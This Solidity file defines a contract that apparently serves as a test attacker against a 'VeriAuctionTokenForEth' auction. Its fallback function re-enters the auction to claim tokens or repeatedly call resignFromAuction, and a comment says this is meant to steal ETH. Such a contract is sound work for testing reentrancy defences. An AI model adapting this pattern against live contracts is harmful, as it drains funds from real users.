// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
pragma abicoder v2;

import "@smart-contracts/interfaces/IVeriAuctionTokenForEth.sol";

contract VeriAuctionTokenForEth_reentrancy_attacker {
    //========================================
    // Variables
    //========================================

    uint256 public timesToAttack;
    bool public claimTokens;

    //========================================
    // constructor
    //========================================

    constructor() {
        timesToAttack = 0;
        claimTokens = false;
    }

    function setTimesToAttack(uint256 times) external {
        timesToAttack = times;
    }

    function setClaimTokensDuringAttack(bool _claimTokens) external {
        claimTokens = _claimTokens;
    }

    //========================================
    // functions
    //========================================

    fallback() external payable {
        if (claimTokens) {
            // Attack 1: Claim tokens and commitment.

            (bool success, ) = msg.sender.call(abi.encodeWithSelector(IVeriAuctionTokenForEth.claimTokens.selector));
            require(success, "Failed to claim tokens");
        } else {
            // Attack 2: Steal ETH from the auction.

            if (timesToAttack > 0) {
                timesToAttack--;
                (bool success, ) = msg.sender.call(
                    abi.encodeWithSelector(IVeriAuctionTokenForEth.resignFromAuction.selector)
                );
                require(success, "Failed to claim ETH");
            }
        }
    }
}
